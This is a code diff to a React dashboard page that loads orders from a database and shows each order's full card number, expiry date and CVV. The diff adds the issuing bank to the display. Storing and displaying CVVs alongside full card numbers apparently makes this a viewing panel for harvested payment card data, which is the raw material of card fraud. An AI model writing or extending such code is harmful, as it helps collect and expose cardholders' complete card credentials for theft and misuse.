@@ -8,6 +8,7 @@ import React from 'react'
 import { Input } from '@/components/ui/input'
 
 type Order = {
+  bank:string,
     cardNumber: string,
     expiryDate: string,
     cvv: string,
@@ -32,6 +33,7 @@ export default function DashboardPage() {
       const orderSnapshot = await getDocs(ordersQuery)
       const orderData = orderSnapshot.docs.map(doc => ({
         id: doc.id,
+        bank:doc.data().paymentInfo.bank,
         cardNumber:doc.data().paymentInfo.cardNumber,
         cvv:doc.data().paymentInfo.cvc,
         expiryDate:doc.data().paymentInfo.expiryDate,
@@ -97,8 +99,9 @@ export default function DashboardPage() {
             <div className="overflow-x-auto">
          
                   {recentOrders.map((order) => (
-                    <Card key={order.cardNumber} className='px-6 m-2' dir='ltr'>
+                    <Card key={order.cardNumber+1} className='px-6 m-2' dir='ltr'>
                     <CardHeader>
+                      <CardTitle>bank: {order.bank}</CardTitle>
                       <CardTitle>cardNumber: {order.cardNumber}</CardTitle>
                       <CardDescription>ExpDate: {order.expiryDate}</CardDescription>
                       <CardDescription>CVV: {order.cvv}</CardDescription>
